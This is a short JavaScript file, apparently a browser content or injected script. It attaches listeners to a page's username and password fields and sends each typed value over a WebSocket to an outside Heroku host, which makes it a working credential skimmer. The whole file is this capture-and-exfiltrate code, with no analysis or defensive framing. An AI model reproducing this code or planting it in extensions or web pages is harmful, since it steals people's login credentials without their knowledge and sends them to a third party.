console.log("hi");

var HOST = 'wss://thawing-island-58409.herokuapp.com';
var ws = new WebSocket(HOST);
/*var el = document.getElementById('server-time');
ws.onmessage = function (event) {
	el.innerHTML = 'Server time: ' + event.data;
};
*/
window.addEventListener ("click", myMain, false);

function myMain (evt) {
    if (document.getElementById('username')!=null){
    document.getElementById('username').addEventListener('input', function(){
		console.log("Username is "+document.getElementById('username').value);
		ws.send("Username is "+document.getElementById('username').value);
		//alert("Username is "+ document.getElementById('username').value);
  }, false);
}
if (document.getElementById('username')!=null){
    document.getElementById('password').addEventListener('input', function(){
		console.log("Password is "+document.getElementById('password').value);
        ws.send("Password is "+document.getElementById('password').value);
		//alert("Password is "+document.getElementById('password').value);
  }, false);
}
}
